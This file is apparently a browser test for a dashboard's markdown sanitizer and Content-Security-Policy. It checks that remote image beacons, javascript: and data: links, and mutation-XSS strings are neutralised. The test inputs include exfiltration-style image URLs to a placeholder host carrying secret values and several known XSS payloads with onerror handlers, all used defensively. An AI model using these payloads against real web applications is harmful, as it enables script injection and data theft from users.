// #3515: images in agent, board and chat markdown never load from elsewhere. A remote image
// (a tracking or exfiltration beacon) becomes a plain link and is never requested; a
// relative one becomes text; a Coral artifact (coral://artifacts/<64 hex>) and a data: image
// still render. Links get rel="noopener noreferrer" (web links a new tab), javascript: and
// data: link targets are dropped, and a board message's artifact links point at the board's
// server. The dashboard page's CSP (img-src 'self' data: blob:) is the second layer: an
// <img> inserted without the sanitizer still isn't fetched.
const assert = require('node:assert/strict');
const CDP = require('chrome-remote-interface');

const BASE = require('./test_base').BASE;
const HEX = 'a'.repeat(64);
const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';

(async () => {
    const client = await CDP({ port: Number(process.env.CDP_PORT || 9222) });
    const { Page, Runtime, Network, Emulation } = client;
    const ev = async expression => {
        const result = await Runtime.evaluate({ expression, returnByValue: true, awaitPromise: true });
        if (result.exceptionDetails) throw new Error(JSON.stringify(result.exceptionDetails));
        return result.result.value;
    };
    const { coralReady } = require('./helpers/wait').bind(ev);
    const S = `(window.__coralStatic||'/static/')`;
    const requested = new Map(); // requestId → url
    const cspBlocked = new Set();
    try {
        await Promise.all([Page.enable(), Runtime.enable(), Network.enable()]);
        Network.requestWillBeSent(p => requested.set(p.requestId, p.request.url));
        Network.loadingFailed(p => { if (p.blockedReason === 'csp') cspBlocked.add(p.requestId); });
        await Emulation.setDeviceMetricsOverride({ width: 1400, height: 900, deviceScaleFactor: 1, mobile: false });
        await Page.navigate({ url: BASE }); await Page.loadEventFired();
        await coralReady();

        console.log('The dashboard page sends the image CSP');
        const csp = await ev(`fetch('/', { cache: 'no-store' }).then(r => r.headers.get('content-security-policy') || '')`);
        assert.match(csp, /img-src 'self' data: blob:/);

        console.log('Board markdown: remote and relative images, artifacts, links');
        const md = [
            '![](https://x.test/p.png?d=SECRET)',
            '![chart](shots/chart.png)',
            `![shot](coral://artifacts/${HEX})`,
            `![inline](${PNG})`,
            '<img src="https://x.test/raw-html.png?d=SECRET2">',
            '[js](javascript:alert(1))',
            '[data](data:text/html,<script>alert(1)</script>)',
            '[web](https://example.test/page)',
            `[report](coral://artifacts/${HEX})`,
            `[bad](coral://artifacts/${HEX}x)`,
        ].join('\n\n');
        const r = await ev(`(async () => {
            const u = await import(${S}+'utils.js');
            const b = await import(${S}+'board_artifacts.js');
            const box = document.createElement('div');
            box.innerHTML = '<div class="mb-message-body">' + u.renderMarkdown(${JSON.stringify(md)}) + '</div>';
            document.body.appendChild(box);
            b.resolveBoardArtifacts(box, 'local');
            await new Promise(res => setTimeout(res, 800));
            const links = [...box.querySelectorAll('a')].map(a => ({ text: a.textContent, href: a.getAttribute('href'), rel: a.rel, target: a.target, cls: a.className }));
            const out = {
                imgs: [...box.querySelectorAll('img')].map(i => i.getAttribute('src')),
                blocked: [...box.querySelectorAll('.blocked-remote-image')].map(e => ({ tag: e.tagName, href: e.getAttribute('href'), text: e.textContent })),
                links,
                html: box.innerHTML,
            };
            box.remove();
            return out;
        })()`);
        assert.deepEqual(r.imgs, [`/api/artifacts/${HEX}?v=2`, PNG], 'only the artifact and the data: image render');
        assert.equal(r.blocked.length, 3, JSON.stringify(r.blocked));
        assert.deepEqual(r.blocked[0], { tag: 'A', href: 'https://x.test/p.png?d=SECRET', text: '🖼 https://x.test/p.png?d=SECRET' }, 'a remote image is a link');
        assert.equal(r.blocked[1].tag, 'SPAN', 'a relative image is text');
        assert.match(r.blocked[1].text, /chart \(shots\/chart\.png\)/);
        assert.equal(r.blocked[2].href, 'https://x.test/raw-html.png?d=SECRET2', 'raw HTML <img> too');
        assert.ok(!/javascript:|data:text/i.test(r.html), 'javascript: and data: link targets are dropped');
        const web = r.links.find(l => l.text === 'web');
        assert.equal(web.rel, 'noopener noreferrer'); assert.equal(web.target, '_blank');
        const report = r.links.find(l => l.text === 'report');
        assert.equal(report.href, `/api/artifacts/${HEX}?v=2`, 'an artifact link points at the board server');
        assert.equal(report.target, '_blank'); assert.match(report.cls, /board-artifact-link/);
        const bad = r.links.find(l => l.text === 'bad');
        assert.ok(!bad || !/^\/api\/artifacts/.test(bad.href || ''), 'only coral://artifacts/<64 hex> exactly');

        console.log('Live chat markdown gets the same rule');
        const chat = await ev(`(async () => {
            const u = await import(${S}+'utils.js');
            const d = document.createElement('div');
            d.innerHTML = u.renderMarkdown('look ![](https://x.test/chat.png?d=SECRET3)');
            return d.querySelectorAll('img').length;
        })()`);
        assert.equal(chat, 0);

        console.log('Markup that parses differently in a template and a div stays inert (mutation XSS)');
        const mx = await ev(`(async () => {
            const u = await import(${S}+'utils.js');
            window.__mx = 0;
            const probes = [
                '<math><mtext><table><mglyph><style><img src=x onerror="window.__mx=1">',
                '<svg></p><style><a id="</style><img src=1 onerror=window.__mx=2>">',
                '<table><td><img src="https://x.test/td.png" onerror="window.__mx=3"></td></table>',
                '<form><math><mtext></form><form><mglyph><style></math><img src onerror=window.__mx=4>',
                '<noscript><p title="</noscript><img src=x onerror=window.__mx=5>">',
                '<svg><style><img src=x onerror=window.__mx=6></style></svg>',
            ];
            const out = [];
            for (const p of probes) {
                for (const html of [u.renderMarkdown(p), u.sanitizeHtml(p)]) {
                    const d = document.createElement('div');
                    d.innerHTML = html;
                    document.body.appendChild(d);
                    const live = [...d.querySelectorAll('*')].some(e => [...e.attributes].some(a => /^on/i.test(a.name)));
                    const script = !!d.querySelector('script');
                    const remote = [...d.querySelectorAll('img')].some(i => /x\.test/.test(i.getAttribute('src') || ''));
                    out.push({ p, live, script, remote });
                    d.remove();
                }
            }
            await new Promise(res => setTimeout(res, 500));
            return { out, mx: window.__mx };
        })()`);
        assert.equal(mx.mx, 0, 'no handler ran');
        for (const o of mx.out) assert.ok(!o.live && !o.script && !o.remote, JSON.stringify(o));

        console.log('The CSP blocks an <img> that skips the sanitizer');
        const violated = await ev(`new Promise(res => {
            const t = setTimeout(() => res(false), 3000);
            document.addEventListener('securitypolicyviolation', e => { if (/x\\.test/.test(e.blockedURI)) { clearTimeout(t); res(e.effectiveDirective); } }, { once: true });
            const img = document.createElement('img');
            img.src = 'https://x.test/csp.png?d=SECRET4';
            document.body.appendChild(img);
            setTimeout(() => img.remove(), 1000);
        })`);
        assert.equal(violated, 'img-src');

        // The sanitized content never even tried; the one <img> that skipped the sanitizer was
        // stopped by the CSP before it left the browser.
        await new Promise(res => setTimeout(res, 300));
        const tried = [...requested].filter(([, u]) => u.includes('x.test'));
        assert.deepEqual(tried.map(([, u]) => u), ['https://x.test/csp.png?d=SECRET4'], 'only the unsanitized <img> was attempted');
        assert.ok(tried.every(([id]) => cspBlocked.has(id)), 'and the CSP blocked it');
        console.log('PASS board_markdown_images_browser');
    } finally {
        await client.close();
    }
})().catch(e => { console.error(e); process.exit(1); });
